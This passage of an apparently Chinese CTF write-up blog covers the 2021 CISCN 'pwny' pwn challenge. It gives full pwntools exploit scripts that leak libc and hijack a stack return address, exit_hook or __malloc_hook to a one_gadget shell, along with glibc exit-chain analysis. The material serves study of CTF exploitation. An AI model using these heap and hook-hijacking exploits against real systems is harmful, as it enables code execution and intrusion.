class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = remote(&quot;124.71.230.240&quot;,&quot;26157&quot;)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;pwny&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.27.so&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_s</span>(<span class="params">idx</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_s</span>(<span class="params">idx</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">io.send(idx)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;b *$rebase(0xBA2)&quot;)</span></span><br><span class="line">write_s(<span class="number">0x100</span>)</span><br><span class="line">write_s(<span class="number">0x100</span>)</span><br><span class="line">read_s(p64(<span class="number">0xFFFFFFFFFFFFFFF8</span>))</span><br><span class="line">io.recvuntil(<span class="string">&quot;Result: &quot;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>),<span class="number">16</span>) - libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x10a41c</span></span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*]libc_base =&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">read_s(p64(<span class="number">0xFFFFFFFFFFFFFFA5</span>))</span><br><span class="line">io.recvuntil(<span class="string">&quot;Result: &quot;</span>)</span><br><span class="line">bss_addr = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>),<span class="number">16</span>) - <span class="number">0x9c0</span> +<span class="number">0x202060</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*]bss_addr =&gt; &quot;</span>+<span class="built_in">hex</span>(bss_addr))</span><br><span class="line"></span><br><span class="line">environ = libc_base + libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(environ))</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">read_s(p64((environ-bss_addr)//<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Result: &quot;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>),<span class="number">16</span>) -<span class="number">0x120</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*]stack =&gt; &quot;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">write_s((stack-bss_addr)//<span class="number">8</span>)</span><br><span class="line">io.sendline(p64(one_gadget))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="劫持exit-hook"><a href="#劫持exit-hook" class="headerlink" title="劫持exit_hook"></a>劫持exit_hook</h4><p><a href="https://blog.csdn.net/qq_43116977/article/details/105485947">exit_hook劫持</a></p><p><a href="https://www.cnblogs.com/bhxdn/p/14222558.html">exit_hook在pwn题中的应用</a></p><p>劫持<code>__malloc_hook</code>和<code>__free_hook</code>已经是基本操作了，但是<code>exit_hook</code>却从未涉及过，这里记录一下劫持<code>exit_hook</code>，其实讲<code>exit_hook</code>，也只是是为了跟之前的<code>malloc_hook</code>和<code>free_hook</code>名称统一一下，在调用<code>exit</code>的时候并没有一个叫<code>exit_hook</code>的东西出现，但这并不意味着我们不可以劫持<code>exit</code></p><p>写个小<code>demo</code>来调试看看<code>exit()</code>的调用过程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;welcome to exit\n&quot;</span>);</span><br><span class="line">     <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">     <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>exit</code>处下断点，我们跟进去看看，第一次运行跳到了<code>_dl_runtime_resolve</code>，不用管，重新运行一下好像就可以（应该静态编译的，不过问题不大</p><img src="/2021/10/22/2021%C2%B7CISCN%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9BWP/16.png" class=""><p>进去之后看到它首先调用<code>__run_exit_handlers</code></p><img src="/2021/10/22/2021%C2%B7CISCN%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9BWP/17.jpg" class=""><p>在<a href="https://github.com/lunaczp/glibc-2.27">glibc-2.27源码</a>的<code>glibc-2.27-master\stdlib</code>目录下有exit.c的源码，也证实了上面的调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">exit</span> <span class="params">(<span class="keyword">int</span> status)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __run_exit_handlers (status, &amp;__exit_funcs, <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>__run_exit_handlers</code>的源码就在上面，可以看到它调用了三个函数，但是动调的时候并没看到这三个函数，而是先到了<code>do-global-dtors-aux-and-do-global-ctors-aux</code>这两个函数，这个函数好像是用来辅助函数，不知道有啥用</p><p><a href="https://stackoverflow.com/questions/6477494/do-global-dtors-aux-and-do-global-ctors-aux">do-global-dtors-aux-and-do-global-ctors-aux</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    ...</span><br><span class="line"> <span class="keyword">switch</span> (f-&gt;flavor)</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">void</span> (*atfct) (<span class="keyword">void</span>);</span><br><span class="line">     <span class="keyword">void</span> (*onfct) (<span class="keyword">int</span> status, <span class="keyword">void</span> *arg);</span><br><span class="line">     <span class="keyword">void</span> (*cxafct) (<span class="keyword">void</span> *arg, <span class="keyword">int</span> status);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">case</span> ef_free:</span><br><span class="line">   <span class="keyword">case</span> ef_us:</span><br><span class="line">     <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> ef_on:</span><br><span class="line">            ...</span><br></pre></td></tr></table></figure><p>之后就是<code>_dl_fini</code>函数</p><img src="/2021/10/22/2021%C2%B7CISCN%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9BWP/18.jpg" class=""><p>下面是源码在<code>glibc-2.27-master\elf</code>，为了查看方便，这里删去了绝大部分的代码，这里只留下两个关键的函数调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_dl_fini (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    __rtld_lock_lock_recursive (GL(dl_load_lock));</span><br><span class="line">...</span><br><span class="line">  __rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line">      ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>找到它的定义发现它与<code>_rtld_local</code>有关</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __libc_lock_lock_recursive(NAME)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __rtld_lock_lock_recursive(NAME)</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">if</span> IS_IN (rtld)</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> GL(name) _rtld_local._##name</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> GL(name) _rtld_global._##name</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>用<code>pwndbg</code>可以查看<code>_rtld_global</code>这个结构体，也是删掉了好多</p><p>至此我们可以整理一下<code>exit</code>函数的调用链<code>exit() -&gt; _exit() -&gt; __run_exit_handlers -&gt; do-global-dtors-aux -&gt; do-global-ctors-aux -&gt; _dl_fini -&gt; __rtld_lock_lock_recursive/__rtld_lock_unlock_recursive </code>，只知道了这些链条之后，我们就可以进行劫持<code>__rtld_lock_lock_recursive/__rtld_lock_unlock_recursive</code>变成我们的<code>one_gadget</code>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p _rtld_global</span><br><span class="line">$1 = &#123;</span><br><span class="line">...</span><br><span class="line">    l_next = 0x0, </span><br><span class="line">    l_prev = 0x7f1c918c9000, </span><br><span class="line">    l_real = 0x7f1c918e39f0 &lt;_rtld_global+2448&gt;, </span><br><span class="line">    l_ns = 0, </span><br><span class="line">    l_libname = 0x7f1c918e4030 &lt;_dl_rtld_libname&gt;, </span><br><span class="line"> ...</span><br><span class="line">    l_tls_dtor_count = 0, </span><br><span class="line">    l_relro_addr = 2266752, </span><br><span class="line">    l_relro_size = 2432, </span><br><span class="line">    l_serial = 0, </span><br><span class="line">    l_audit = 0x7f1c918e3e60 &lt;_rtld_global+3584&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  audit_data = &#123;&#123;</span><br><span class="line">      cookie = 0, </span><br><span class="line">      bindflags = 0</span><br><span class="line">    &#125; &lt;repeats 16 times&gt;&#125;, </span><br><span class="line">  _dl_rtld_lock_recursive = 0x7f1c916ba0e0 &lt;rtld_lock_default_lock_recursive&gt;, </span><br><span class="line">  _dl_rtld_unlock_recursive = 0x7f1c916ba0f0 &lt;rtld_lock_default_unlock_recursive&gt;, </span><br><span class="line">  _dl_make_stack_executable_hook = 0x7f1c916ccea0 &lt;__GI__dl_make_stack_executable&gt;, </span><br><span class="line">  _dl_stack_flags = 6, </span><br><span class="line">  _dl_tls_dtv_gaps = false, </span><br><span class="line">  _dl_tls_max_dtv_idx = 1, </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里一个计算的技巧是<code>_dl_rtld_lock_recursive</code>是<code>_rtld_global+3848</code>，我们可以在上面的结构体当中看到<code>l_real = 0x7f1c918e39f0 &lt;_rtld_global+2448&gt;</code>所以我们拿这个地址减去2448就是<code>_rtld_global</code>的地址，再加上3848就是<code>_dl_rtld_lock_recursive</code>，<code>_dl_rtld_unlock_recursive</code>同理</p><img src="/2021/10/22/2021%C2%B7CISCN%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9BWP/19.png" class=""><p>在这还有个小知识点，在查找<code>one_gadget</code>的时候如果直接用下面这条查找出来的<code>one_gadget</code>不太够用，但是如果我们加上<code>-l2</code>这个参数呢？</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">➜ one_gadget libc-2.27.so -l2</span><br><span class="line"></span><br><span class="line">0x4f3d5 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rsp &amp; 0xf == 0</span><br><span class="line">  rcx == NULL</span><br><span class="line"></span><br><span class="line">0x4f432 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x40] == NULL</span><br><span class="line"></span><br><span class="line">0x10a41c execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure><p>可以看到多了几条<code>one_gadget</code>，但是相对来说条件也更加苛刻，但是有时候就是这么碰巧呢？对吧！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">➜ one_gadget libc-2.27.so -l2</span><br><span class="line">0x4f3d5 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rsp &amp; 0xf == 0</span><br><span class="line">  rcx == NULL</span><br><span class="line"></span><br><span class="line">0x4f432 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x40] == NULL</span><br><span class="line"></span><br><span class="line">0xe5617 execve(<span class="string">&quot;/bin/sh&quot;</span>, [rbp-0x88], [rbp-0x70])</span><br><span class="line">constraints:</span><br><span class="line">  [[rbp-0x88]] == NULL || [rbp-0x88] == NULL</span><br><span class="line">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL</span><br><span class="line"></span><br><span class="line">0xe561e execve(<span class="string">&quot;/bin/sh&quot;</span>, rcx, [rbp-0x70])</span><br><span class="line">constraints:</span><br><span class="line">  [rcx] == NULL || rcx == NULL</span><br><span class="line">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL</span><br><span class="line"></span><br><span class="line">0xe5622 execve(<span class="string">&quot;/bin/sh&quot;</span>, rcx, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [rcx] == NULL || rcx == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br><span class="line"></span><br><span class="line">0x10a41c execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br><span class="line"></span><br><span class="line">0x10a428 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsi, [rax])</span><br><span class="line">constraints:</span><br><span class="line">  [rsi] == NULL || rsi == NULL</span><br><span class="line">  [[rax]] == NULL || [rax] == NULL</span><br></pre></td></tr></table></figure><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(&quot;124.71.230.240&quot;,&quot;26157&quot;)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;pwny&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_s</span>(<span class="params">idx</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_s</span>(<span class="params">idx</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">p.send(idx)</span><br><span class="line"></span><br><span class="line">write_s(<span class="number">256</span>)</span><br><span class="line">write_s(<span class="number">256</span>)</span><br><span class="line">read_s(p64(<span class="number">0xFFFFFFFFFFFFFFE7</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Result: &quot;</span>)</span><br><span class="line">libcbase = <span class="built_in">int</span>(p.recvuntil(<span class="string">&quot;\n&quot;</span>)[<span class="number">0</span>:-<span class="number">1</span>],<span class="number">16</span>)-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line">read_s(p64(<span class="number">0xFFFFFFFFFFFFFFA5</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Result: &quot;</span>)</span><br><span class="line">bss_addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>),<span class="number">16</span>) - <span class="number">0x9c0</span> +<span class="number">0x202060</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*]bss_addr =&gt; &quot;</span>+<span class="built_in">hex</span>(bss_addr))</span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x10a41c</span>,<span class="number">0x4f432</span>,<span class="number">0x4f3d5</span>,<span class="number">0xe5617</span>,<span class="number">0xe561e</span>,<span class="number">0xe5622</span>,<span class="number">0x10a428</span>]</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">exit_hook = <span class="built_in">str</span>((libcbase+<span class="number">0x61bf60</span>-bss_addr)/<span class="number">8</span>)[<span class="number">0</span>:-<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;exit_hook =&gt;&quot;</span>+exit_hook)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,exit_hook)</span><br><span class="line">p.send(p64(libcbase+one[<span class="number">6</span>]))</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;3&#x27;</span>)<span class="comment">#触发exit</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="劫持malloc-hook"><a href="#劫持malloc-hook" class="headerlink" title="劫持malloc_hook"></a>劫持malloc_hook</h4><p>还记得在输入的时候用的是<code>scanf</code>嘛，<code>scanf</code>有个特性，就是当输入的字符串过长的时候，会分配堆块来存放字符串，这就给我们劫持<code>__malloc_hook</code>提供可能，我们只要往<code>__malloc_hook</code>里面写入<code>one_gadget</code>，再输入一长串的字符串，就能触发程序<code>malloc</code>，达到<code>one_gadget</code>的目的，但是这里需要用<code>realloc</code>来跳转栈帧才能是成功执行<code>one_gadget</code>，所以这里的调用链是<code>malloc -&gt; __malloc_hook -&gt; realloc -&gt; one_gadget</code></p><img src="/2021/10/22/2021%C2%B7CISCN%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9BWP/20.jpg" class=""><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = remote(&quot;124.71.230.240&quot;,&quot;26157&quot;)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;pwny&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.27.so&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_s</span>(<span class="params">idx</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_s</span>(<span class="params">idx</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">io.send(idx)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">write_s(<span class="number">0x100</span>)</span><br><span class="line">write_s(<span class="number">0x100</span>)</span><br><span class="line">read_s(p64(<span class="number">0xFFFFFFFFFFFFFFF8</span>))</span><br><span class="line">io.recvuntil(<span class="string">&quot;Result: &quot;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>),<span class="number">16</span>) - libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4f432</span></span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*]libc_base =&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*]realloc_hook =&gt; &quot;</span>+<span class="built_in">hex</span>(realloc_hook))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*]malloc_hook =&gt; &quot;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"></span><br><span class="line">read_s(p64(<span class="number">0xFFFFFFFFFFFFFFA5</span>))</span><br><span class="line">io.recvuntil(<span class="string">&quot;Result: &quot;</span>)</span><br><span class="line">bss_addr = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>),<span class="number">16</span>) - <span class="number">0x9c0</span> +<span class="number">0x202060</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*]bss_addr =&gt; &quot;</span>+<span class="built_in">hex</span>(bss_addr))</span><br><span class="line"></span><br><span class="line">offset = (malloc_hook - bss_addr)//<span class="number">8</span></span><br><span class="line">write_s(offset)</span><br><span class="line">io.sendline(p64(realloc+<span class="number">14</span>))</span><br><span class="line"></span><br><span class="line">write_s(offset-<span class="number">1</span>)</span><br><span class="line">io.sendline(p64(one_gadget))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">b&quot;1&quot;</span>*<span class="number">0x400</span>)   </span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://x1ng.top/2021/05/16/ciscn-%E5%88%9D%E8%B5%9B-2021-wp/">ciscn 初赛 2021</a></p><p><a href="https://nuoye-blog.github.io/2021/05/16/466a7375/">2021CISCN初赛-WP(PWN)</a></p><p><a href="https://r1nd0.github.io/2021/05/17/CISCN2021%E7%BA%BF%E4%B8%8A%E8%B5%9B-pwn/">CISCN2021线上赛_pwn</a></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021·第二届羊城杯WP</title>
      <link href="/2021/10/17/2021%C2%B7%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BE%8A%E5%9F%8E%E6%9D%AFWP/"/>
      <url>/2021/10/17/2021%C2%B7%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BE%8A%E5%9F%8E%E6%9D%AFWP/</url>
      
